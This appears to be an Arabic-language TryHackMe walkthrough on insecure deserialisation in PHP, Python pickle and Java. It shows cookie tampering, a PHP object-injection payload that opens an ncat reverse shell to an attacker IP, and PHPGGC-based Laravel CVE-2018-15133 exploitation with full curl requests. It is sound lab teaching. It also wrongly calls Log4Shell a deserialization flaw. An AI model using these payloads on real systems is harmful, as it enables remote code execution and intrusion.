# TryHackMe Insecure Deserialisation Walkthrough

<img width="1902" height="355" alt="image" src="https://github.com/user-attachments/assets/3d53545f-05a3-492c-b22b-712d531fb5a9" />

---



<details>
  <summary>Some Important Concepts</summary>



🧠 أولًا: Serialisation (ببساطة كده)
====================================

تخيل عندك object في البرنامج:

```
$noteArray = array(\
 "title" => "My THM Note",\
 "content" => "Welcome to THM!"\
);
```

💡 ده object (array) جوا البرنامج\
❌ مش ينفع يتبعت بسهولة في:

-   file
-   cookie
-   network

* * * * *

✅ الحل: Serialisation
---------------------

بنحوله لـ string:

```
a:2:{s:5:"title";s:12:"My THM Note";s:7:"content";s:12:"Welcome to THM!";}
```

📌 ده اسمه **Serialized Data**

### معناه إيه؟

-   `a:2` → array فيها 2 elements
-   `s:5:"title"` → string طوله 5
-   وهكذا...

👉 يعني:\
**حوّلنا object → string عشان يتخزن أو يتبعت**

* * * * *

📦 ثانيًا: Deserialisation
==========================

العكس بقى 👇

```
$noteArray = unserialize($serialisedNote);
```

📌 ده بيعمل:\
string → object

يعني يرجع الداتا زي ما كانت

* * * * *

💀 المشكلة فين بقى؟ (هنا الهجوم)
================================

لو السيرفر عمل كده:

```
$user = unserialize($_COOKIE['user']);
```

⚠️ هنا كارثة لو:

-   الcookie دي من user (يعني attacker يقدر يعدلها)

* * * * *

🔥 الهجوم ببساطة
================

الـ attacker يعمل:

1.  ياخد الـ serialized object
2.  يعدل فيه
3.  يرجعه للسيرفر

* * * * *

🎯 مثال مهم جدًا
----------------

### الكود الأصلي:

```
O:4:"User":2:{s:4:"name";s:5:"guest";s:4:"role";s:4:"user";}
```

### 💣 انت تعدله:

```
O:4:"User":2:{s:4:"name";s:5:"admin";s:4:"role";s:5:"admin";}
```

🚀 تبعته للسيرفر\
= فجأة بقيت admin 😈

* * * * *

🧨 ليه الموضوع أخطر من كده؟
===========================

مش بس تعديل values...

في PHP فيه حاجة اسمها:

-   `__wakeup()`
-   `__destruct()`

📌 دي functions بتشتغل **أوتوماتيك لما يحصل deserialization**

* * * * *

💀 هنا بقى الـ RCE
------------------

لو فيه class زي:

```
class Exploit {\
 function __destruct() {\
 system($this->cmd);\
 }\
}
```

😈 تقدر تبعت object فيه:

```
cmd = "whoami"
```

📌 أول ما السيرفر يعمل unserialize\
→ الكود يتنفذ

🔥 كده وصلت لـ **Remote Code Execution**

* * * * *

⚠️ ربط الكلام بالـ Real Incidents
=================================

1️⃣ Log4Shell
-------------

-   استغلوا deserialization في Java (Log4j)
-   📌 النتيجة: RCE على مستوى عالمي

* * * * *

2️⃣ WebLogic
------------

-   بعتوا objects malicious
-   السيرفر فكها → نفذ الكود

* * * * *

3️⃣ Jenkins
-----------

-   نفس الفكرة
-   object متفبرك → shell access

* * * * *

🧠 الخلاصة (احفظها وانت داخل أي CTF)
====================================

### أي Deserialization = خطر لو:

-   الداتا جاية من user
-   مفيش validation

* * * * *

⚔️ خطواتك في الروم
------------------

1.  🔍 دور على:
    -   cookie
    -   hidden field
    -   POST data
2.  👀 لو لقيت:
    -   `a:` أو `O:` → PHP serialization
3.  🔓 فكها (CyberChef)
4.  ✏️ عدل:
    -   role
    -   isAdmin
    -   userId
5.  🚀 ابعتها






<img width="1654" height="453" alt="image" src="https://github.com/user-attachments/assets/be8eefd0-a2df-49aa-94d9-b297a6c27abb" />


  
</details>




<details>
  <summary>Formats Serialisation</summary>


🧠 الفكرة الأساسية (قبل التفاصيل)
=================================

📌 أي لغة برمجة:

-   بتحول object → string/binary (Serialization)
-   وترجعه تاني (Deserialization)

💣 المشكلة:\
مش في الطريقة...\
المشكلة في **إنك بتتحكم في الداتا قبل ما تتفك**

* * * * *

⚔️ الفرق بين اللغات (مهم جدًا في CTF)
=====================================

🟣 PHP (أهم واحدة في CTF)
-------------------------

### الشكل:

```
O:5:"Notes":1:{s:7:"content";s:14:"Welcome to THM";}
```

### 📌 معناه:

-   `O:5:"Notes"` → object من class اسمه Notes
-   `1` → فيه property واحدة
-   `s:7:"content"` → اسم الخاصية
-   `s:14:"Welcome to THM"` → القيمة

* * * * *

💀 الخطورة في PHP
-----------------

الـ PHP بيعمل:

```
unserialize($data);
```

👉 بدون validation = 💣

* * * * *

🔥 Magic Methods (أخطر نقطة)
----------------------------

دي functions بتشتغل لوحدها أثناء deserialization:

### أهمهم:

### 1️⃣ `__wakeup()`

-   بيتنفذ أول ما object يتفك

### 2️⃣ `__destruct()`

-   بيتنفذ لما object يتقفل

* * * * *

💣 استغلالها (RCE)
------------------

لو لقيت class زي:

```
class Exploit {\
 function __destruct() {\
 system($this->cmd);\
 }\
}
```

😈 تقدر تبعت:

cmd = "ls"

🚀 أول ما السيرفر يعمل unserialize\
→ الكود يتنفذ

* * * * *

🟢 Python (Pickle) --- أخطر مما تتخيل 💀
======================================

الشكل:
------

```
pickle.loads(base64.b64decode(data))
```

📌 يعني:

1.  decode base64
2.  فك pickle

* * * * *

💣 المشكلة
----------

`pickle.loads()` **مش بس بيرجع data...**


❌ ده ممكن ينفذ كود!

* * * * *

🔥 ليه؟
-------

لأن pickle بيدعم:

-   function calls
-   object reconstruction

* * * * *

😈 استغلال عملي
---------------

ممكن تعمل payload ينفذ:

```
os.system("whoami")
```

🚀 أول ما السيرفر يعمل:

```
pickle.loads()
```

→ BOOM 💥 RCE

* * * * *

⚠️ ليه بيستخدموا Base64؟
========================

علشان:

-   الـ pickle binary (مش readable)
-   Base64 يحوله string ينفع يتحط في:
    -   HTML
    -   Cookies
    -   Requests

* * * * *

🔍 عقلية الـ Pentester (أهم جزء)
================================

لما تشوف:
---------

### 1️⃣ PHP:

-   `O:` → object
-   `a:` → array

👉 يبقى:

-   عدل values
-   أو exploit magic methods

* * * * *

### 2️⃣ Python:

-   string غريب زي:

```
gASVIQAAAAAAAACM...
```

👉 غالبًا:

-   Base64 + Pickle

📌 تعمل:

-   decode
-   تحلل payload

* * * * *

🧨 باقي اللغات (سريع كده)
=========================

☕ Java
------

-   بيستخدم Serializable
-   💀 أشهر attacks: Gadget Chains
-   Tools: ysoserial

* * * * *

🟦 .NET
-------

-   كان بيستخدم BinaryFormatter (خطر جدًا)
-   دلوقتي: JSON safer

* * * * *

💎 Ruby
-------

-   Marshal
-   برضه vulnerable

* * * * *

💥 أهم فكرة لازم تطلع بيها
==========================

❗ Deserialization = مش parsing عادي
-----------------------------------

👉 ده:\
**Execution محتمل للكود**

* * * * *

⚔️ Flow الهجوم في أي روم
========================

1.  🔍 لاقي serialized data
2.  🧠 حدد اللغة
3.  🔓 decode (لو base64)
4.  ✏️ عدل أو inject payload
5.  🚀 ابعت request
6.  👀 راقب response

* * * * *

🔥 Pro Tips (من قلب الـ CTF)
============================

-   PHP = أسهل بداية
-   Python pickle = أخطر
-   لو لقيت class names → دور على gadgets
-   tools مهمة:
    -   PHPGGC
    -   ysoserial
    -   CyberChef





<img width="1631" height="480" alt="image" src="https://github.com/user-attachments/assets/969a0ca1-5c07-4716-bc53-cfe8064deac9" />


```
gASVNQAAAAAAAACMCF9fbWFpbl9flIwFTm90ZXOUk5QpgZR9lIwFbm90ZXOUXZSMCllvdSBnb3QgaXSUYXNiLg==
```

```
O:5:"Notes":1:{s:7:"content";s:10:"You got it";}
```

```
Marshal
```



  
</details>





<details>
  <summary>Identification</summary>


🧠 الفكرة الأساسية
==================

قبل ما تعمل exploit لازم تجاوب على سؤال:

> **هل أصلاً التطبيق بيستخدم deserialization؟**

لو الإجابة = آه\
👉 يبقى عندك potential goldmine 💰

* * * * *

⚔️ أول حالة: عندك Source Code (White Box)
=========================================

دي أسهل بكتير 👇

🎯 تدور على إيه؟
----------------

### 🔍 Functions خطيرة:

-   PHP:

```
serialize()\
unserialize()
```

-   Python:

```
pickle.loads()\
pickle.dumps()
```

* * * * *

💣 أخطر سيناريو
---------------

لو لقيت حاجة زي:

```
unserialize($_POST['data']);
```

أو

```
pickle.loads(request.data)
```

👉 كده:\
❌ User input داخل مباشرة في deserialization\
🔥 يعني انت تقدر تتحكم في object

* * * * *

🧠 تفكيرك هنا:
--------------

-   هل أقدر أعدل data؟
-   هل فيه classes فيها magic methods؟
-   هل أقدر أوصل لـ RCE؟

* * * * *

🕵️‍♂️ تاني حالة: مفيش Source Code (Black Box)
==============================================

💀 دي اللي بتحصل في CTF والواقع

* * * * *

🔍 1. تحليل الـ Responses
=========================

🚨 Error Messages (كنز!)
------------------------

لو شفت:

-   `unserialize() error`
-   `object deserialization failed`

👉 اعرف فورًا:\
🔥 التطبيق بيستخدم serialization

* * * * *

⚠️ Behavior غريب
----------------

لو عدلت cookie أو request:

-   الموقع باظ
-   أو رجع error
-   أو behavior اتغير

👉 ده معناه:\
**الداتا دي بتتفك وبتأثر على logic**

* * * * *

🍪 2. تحليل الـ Cookies (أهم نقطة)
==================================

🎯 دور على:
-----------

### 1️⃣ Base64

حاجة زي:

```
Tzo1OiJOb3RlcyI6MTp7cz...
```

👉 اعمل:

-   decode

📌 لو طلع:

```
O:5:"Notes":1:{...}
```

💀 jackpot

* * * * *

### 2️⃣ PHP Serialized مباشرة

```
O:4:"User":2:{...}
```

👉 جاهزة للتعديل 😈

* * * * *

### 3️⃣ ASP.NET (__VIEWSTATE)

لو لقيت:

```
__VIEWSTATE=...
```

👉 غالبًا:

-   Base64
-   فيه serialized data

* * * * *

🧪 3. Trick مهم جدًا (~)
========================

جرب:

```
index.php~\
login.php~\
config.php~
```

👉 ليه؟

💡 بعض editors بيعملوا backup files\
ممكن تلاقي:

-   source code
-   أو serialized logic

🔥 وده shortcut جامد



-----

<img width="1322" height="254" alt="image" src="https://github.com/user-attachments/assets/70126459-822a-473e-a5f0-499a1c106958" />

```
http://10.129.150.130/who/index.php~
```

<img width="1374" height="552" alt="image" src="https://github.com/user-attachments/assets/fb603aef-d5ff-463f-b8e5-7a971e52bcfa" />




  
</details>




<details>
  <summary>Exploitation - Update Properties</summary>



🎯 الفكرة العامة للتاسك
=======================

عندك:

-   موقع Notes
-   فيه feature: **Share note**
-   ❌ مش شغال غير لو:

```
isSubscribed = true
```

👉 المشكلة؟\
القيمة دي جاية من **Cookie متسيريل**

* * * * *

🍪 شكل الكوكي بعد ما تفك Base64
===============================

```
O:5:"Notes":3:{\
 s:4:"user";s:5:"guest";\
 s:4:"role";s:5:"guest";\
 s:12:"isSubscribed";b:0;\
}
```

* * * * *

🧠 نفهمه بسرعة
==============

📌 المعنى:
----------

-   `O:5:"Notes"` → object من class Notes
-   `3` → فيه 3 properties

* * * * *

🔍 القيم:
---------

### 👤 user:

```
guest
```

### 🎭 role:

```
guest
```

### 💰 isSubscribed:

```
b:0 → false
```

👉 عشان كده مش مسموحلك تعمل share

* * * * *

💀 الثغرة فين؟
==============

السيرفر بيعمل:

```
unserialize($_COOKIE['user_data']);
```

❌ بدون validation\
❌ بدون integrity check

👉 يعني:\
**إنت تتحكم في القيم 😈**

* * * * *

⚔️ الاستغلال (Step by Step)
===========================

🔓 1. فك الـ Cookie
-------------------

-   من Burp أو DevTools
-   decode Base64

* * * * *

✏️ 2. عدّل القيمة
-----------------

غير:

```
b:0
```

إلى:

```
b:1
```

* * * * *

💣 الشكل بعد التعديل:
---------------------

```
O:5:"Notes":3:{\
 s:4:"user";s:5:"guest";\
 s:4:"role";s:5:"guest";\
 s:12:"isSubscribed";b:1;\
}
```

* * * * *

🔁 3. اعمل Base64 encode تاني
-----------------------------

* * * * *

🚀 4. ابعت الكوكي
-----------------

-   Replace في Burp
-   أو في المتصفح

* * * * *

🎉 النتيجة
----------

✔️ السيرفر هيصدق إنك:

```
isSubscribed = true
```

🔥 تقدر تعمل Share\
🏴‍☠️ وتاخد الفلاج

* * * * *

🧠 ليه الهجوم نجح؟
==================

لأن:
----

السيرفر:

-   وثق في user input ❌
-   استخدم unserialize مباشرة ❌
-   معملش:
    -   signature
    -   encryption
    -   validation

* * * * *

💡 نقطة مهمة جدًا (CTF Trick)
=============================

حتى لو properties **private** 👇

```
private $isSubscribed;
```

👉 تقدر تعدلها عادي في serialized object 💀

* * * * *

⚠️ حاجة لازم تاخد بالك منها
===========================

في بعض الحالات:

-   طول الـ string لازم يبقى صح

مثلاً:

```
s:5:"guest"
```

لو غيرت القيمة:\
👉 لازم تعدل الرقم برضه




------


<img width="1452" height="609" alt="image" src="https://github.com/user-attachments/assets/6d7c3c39-7ee6-4a60-ab17-363eb0aba4cb" />









  
</details>




<details>
  <summary>Exploitation - Object Injection</summary>



🧠 الأول: يعني إيه Object Injection؟
====================================

ببساطة:

> بدل ما تعدل value بس (زي isSubscribed)\
> ❌ لا\
> انت بتبعت **Object كامل malicious**

👉 والسيرفر يفكه بـ `unserialize()`\
→ يشغّل كود من غير ما يقصد 💣

* * * * *

💀 فين الثغرة هنا؟
==================

الكود بيعمل:

```
$test = unserialize($serializedData);
```

❌ بدون أي validation\
❌ user هو اللي بيتحكم في input

* * * * *

🔥 أهم نقطة في الهجوم
=====================

⚠️ لازم يكون فيه:
-----------------

### Magic Method زي:

```
__wakeup()
```

* * * * *

🧨 الكلاس الخطير (في test.php)
==============================

```
class MaliciousUserData {\
 public $command = 'ncat ...';

 public function __wakeup() {\
 exec($this->command);\
 }\
}
```

* * * * *

💣 يعني إيه ده؟
---------------

أول ما السيرفر يعمل:

```
unserialize()
```

👉 أوتوماتيك:

__wakeup() يتنفذ

😈 وينفذ:

```
exec($this->command);
```

* * * * *

⚔️ الهجوم الحقيقي (Step by Step)
================================

🎯 الهدف:
---------

نخلي السيرفر ينفذ:

```
reverse shell
```

* * * * *

🧪 1. نعمل Payload عندنا
------------------------

```
class MaliciousUserData {\
 public $command = 'nc -nv ATTACK_IP 4444 -e /bin/sh';\
}
```

* * * * *

🔁 2. نعمل Serialize
--------------------

```
$serializedData = serialize($maliciousUserData);
```

* * * * *

🔐 3. نعمل Base64
-----------------

```
$payload = base64_encode($serializedData);
```

* * * * *

💥 الناتج:
----------

```
TzoxNzoiTWFsaWNpb3VzVXNlckRhdGEiOjE6...
```

* * * * *

🎧 4. نفتح Listener
-------------------

```
nc  -nvlp  4444
```

* * * * *

🚀 5. نبعته للسيرفر
-------------------

```
http://target/case2/?decode=PAYLOAD
```

* * * * *

💀 اللي بيحصل ورا الكواليس
==========================

1.  السيرفر يستقبل payload
2.  يعمل base64 decode
3.  يعمل unserialize
4.  ينشئ object من:

```
MaliciousUserData
```

1.  ينفذ:

```
__wakeup()
```

1.  يشغل:

```
reverse shell
```

* * * * *

🎉 النتيجة
==========

🔥 shell على السيرفر\
🏴‍☠️ game over

* * * * *

⚠️ نقطة مهمة جدًا
=================

> ❌ انت مش بتغير الكود\
> ✅ انت بتغير القيم داخل object

يعني:

-   `__wakeup()` ثابت
-   لكن `command` انت اللي بتتحكم فيه 😈

* * * * *

🧠 ليه الهجوم نجح؟
==================

بسبب 3 أخطاء قاتلة:
-------------------

### 1️⃣ Untrusted Deserialization

```
unserialize(user_input)
```

* * * * *

### 2️⃣ وجود Magic Method خطير

```
__wakeup() → exec()
```

* * * * *

### 3️⃣ الكلاس موجود في السيرفر

```
require 'test.php';
```

👉 مهم جدًا\
لازم الكلاس يكون موجود عشان الهجوم ينجح





```php
<?php
class MaliciousUserData {
public $command = 'ncat -nv 10.129.117.145 4444 -e /bin/sh';
}

$maliciousUserData = new MaliciousUserData();
$serializedData = serialize($maliciousUserData);
$base64EncodedData = base64_encode($serializedData);
echo "Base64 Encoded Serialized Data: " . $base64EncodedData;
?>
```

```
php test.php
```

```
TzoxNzoiTWFsaWNpb3VzVXNlckRhdGEiOjE6e3M6NzoiY29tbWFuZCI7czozNzoibmMgLW52IDEwLjEyOS4xMTcuMTQ1IDQ0NDQgLWUgL2Jpbi9zaCI7fQ==
```


```
nc -lnvp 4444
```


<img width="945" height="373" alt="image" src="https://github.com/user-attachments/assets/f6516745-2326-436c-ad0c-c090f1901623" />



  
</details>






<details>
  <summary>Automation Scripts</summary>




🧠 الفكرة الكبيرة (Big Picture)
===============================

إنت قبل كده كنت بتعمل:

-   serialize object بنفسك
-   وتعدّل فيه يدوي

💀 ده متعب ومش scalable

* * * * *

💣 هنا بقى يدخل الوحش: **PHPGGC**
=================================

🔥 ببساطة:
----------

> PHPGGC = tool بيعملك payload جاهز لـ RCE بدل ما تكتبه بإيدك

زي:

-   🟢 PHPGGC → للـ PHP
-   🔴 Ysoserial → للـ Java

* * * * *

⚔️ بيعمل إيه بالظبط؟
====================

1️⃣ Gadget Chains
-----------------

بدل ما تعمل class وتدوّر على `__wakeup` أو `__destruct`:

💥 PHPGGC عنده **chains جاهزة**

مثال:

```
php phpggc -l Laravel
```

يطلعلك:

```
Laravel/RCE1\
Laravel/RCE2\
Laravel/RCE3
```

* * * * *

2️⃣ Payload Generation
----------------------

بدل ما تكتب serialize بإيدك:

```
php phpggc Laravel/RCE3 system whoami
```

💀 يطلعلك payload جاهز يعمل:

```
whoami
```

* * * * *

3️⃣ Base64 جاهز كمان
--------------------

php phpggc -b Laravel/RCE3 system whoami

✔️ encoded ready to use

* * * * *

🧠 طيب Gadget Chain دي معناها إيه؟
==================================

دي أهم نقطة 👇

💡 هي سلسلة classes + magic methods
-----------------------------------

زي:

-   `__destruct`
-   `__wakeup`
-   `__toString`

💥 متربطين ببعض بحيث في الآخر:

```
system("whoami");
```

* * * * *

⚔️ السيناريو في Laravel (المهم جدًا)
====================================

💣 vulnerability:
-----------------

```
CVE-2018-15133
```

* * * * *

🧩 Steps
--------

### 1️⃣ تجيب APP_KEY

```
http://target/get-key
```

💀 ده المفتاح اللي بي encrypt بيه Laravel الـ cookies

* * * * *

### 2️⃣ تولّد payload

```
php phpggc -b Laravel/RCE3 system whoami
```

* * * * *

### 3️⃣ تعمل encrypt للـ payload

باستخدام:

```
/app_key + payload → encrypted token
```

(الروم مديالك سكربت جاهز 👍)

* * * * *

### 4️⃣ تبعت request

```
curl target -X POST -H  "X-XSRF-TOKEN: <token>"
```

💥 السيرفر:

-   يفك التشفير
-   يعمل unserialize
-   يشغل payload

* * * * *

💀 ليه الهجوم ده خطير؟
======================

لأن:

✔️ حتى لو data encrypted\
❌ لو فيه unserialize → انتهى

* * * * *

🧠 الفرق بين شغلك الأول وده
===========================

| قبل | دلوقتي |
| --- | --- |
| manual payload | automated |
| basic class | real frameworks |
| simple RCE | complex chains |

* * * * *

🔥 Ysoserial (Java)
===================

نفس الفكرة بس للـ Java:

```
java -jar ysoserial.jar CommonsCollections1 'calc.exe'
```

💀 يفتح calculator 😂


----


<img width="816" height="227" alt="image" src="https://github.com/user-attachments/assets/684a29d5-971b-4e04-9b88-35537196cb7b" />

## get app-key form 

```
http://10.129.150.130:8089/get-key
```

<img width="1919" height="296" alt="image" src="https://github.com/user-attachments/assets/54a0e171-983e-42c1-a1c2-d15802a82721" />


## get command form phpggc

```
php phpggc -b Laravel/RCE3 system "uname -r"
```




<img width="1453" height="160" alt="image" src="https://github.com/user-attachments/assets/f8fdd297-12c8-4730-8902-b83ed6ff7adb" />


```
curl "http://10.129.150.130:8089/cve.php?app_key=HgJVgWjqPKZoJexCzzpN64NZjjVrzIVU5dSbGcW1ZgY%3D&payload=Tzo0MDoiSWxsdW1pbmF0ZVxCcm9hZGNhc3RpbmdcUGVuZGluZ0Jyb2FkY2FzdCI6MTp7czo5OiIAKgBldmVudHMiO086Mzk6IklsbHVtaW5hdGVcTm90aWZpY2F0aW9uc1xDaGFubmVsTWFuYWdlciI6Mzp7czo2OiIAKgBhcHAiO3M6ODoidW5hbWUgLXIiO3M6MTc6IgAqAGRlZmF1bHRDaGFubmVsIjtzOjE6IngiO3M6MTc6IgAqAGN1c3RvbUNyZWF0b3JzIjthOjE6e3M6MToieCI7czo2OiJzeXN0ZW0iO319fQ=="
```


```
X-XSRF-TOKEN: eyJpdiI6InJhOFBKM2dlc2lhaHBTQkZlZHh2M2c9PSIsInZhbHVlIjoiMVpNTFR5ZVJ2OXoyT0ZwNUJ6QnJoQzZwNlo3NEw3QmExXC84ZVhyRFA5K0gxNm5cL1h2RzRYNjZWbm10YXp6TTQzNlFEeStwWmpMYlk1dDZyUHdYdmdNallGWlwvQVRadlEwRzl0R2w4SmFBQ1hwXC9GRWFpTFJzd2VqUU8xMEVhOEJnUzlDTWcxT2hvM2xjQTNFa2NDbW8rcFZOVXl6WCtnWDBwNHU1S3VhQlkyYllFWFdNNDZScCtaOXozT1B3WDBVbW5LcWQ0NWlYRFZzek16VGFXTVU0NlpsZG5tRml4bTk3b2dqT1hlM1lFVTFPVUNSOWhBUnRXcjYrdFlHM0tMZk1mZk5YbVRZVDFPWFV3VGYzWjQzeXljcEFVaVlsdW5MNHd5Uk9kTTdOMFJmdlVCM0p6a0k2YWdnV2wzVVdVcnBOIiwibWFjIjoiMmZlZDYwNTkzMmFiNGU5ZWNlYzA2OGM2YjRiM2Y2MDgwOGFmNDkzZjE1M2NhMTk3N2ZkM2E3OTQ5ZTgzOGFjMCJ9
```



----



```
curl -s 10.129.150.130:8089 \
-X POST \
-H "X-XSRF-TOKEN: eyJpdiI6InJhOFBKM2dlc2lhaHBTQkZlZHh2M2c9PSIsInZhbHVlIjoiMVpNTFR5ZVJ2OXoyT0ZwNUJ6QnJoQzZwNlo3NEw3QmExXC84ZVhyRFA5K0gxNm5cL1h2RzRYNjZWbm10YXp6TTQzNlFEeStwWmpMYlk1dDZyUHdYdmdNallGWlwvQVRadlEwRzl0R2w4SmFBQ1hwXC9GRWFpTFJzd2VqUU8xMEVhOEJnUzlDTWcxT2hvM2xjQTNFa2NDbW8rcFZOVXl6WCtnWDBwNHU1S3VhQlkyYllFWFdNNDZScCtaOXozT1B3WDBVbW5LcWQ0NWlYRFZzek16VGFXTVU0NlpsZG5tRml4bTk3b2dqT1hlM1lFVTFPVUNSOWhBUnRXcjYrdFlHM0tMZk1mZk5YbVRZVDFPWFV3VGYzWjQzeXljcEFVaVlsdW5MNHd5Uk9kTTdOMFJmdlVCM0p6a0k2YWdnV2wzVVdVcnBOIiwibWFjIjoiMmZlZDYwNTkzMmFiNGU5ZWNlYzA2OGM2YjRiM2Y2MDgwOGFmNDkzZjE1M2NhMTk3N2ZkM2E3OTQ5ZTgzOGFjMCJ9"
```

<img width="1382" height="374" alt="image" src="https://github.com/user-attachments/assets/e1d89103-6365-457b-8607-7a712a3557a0" />




  
</details>


































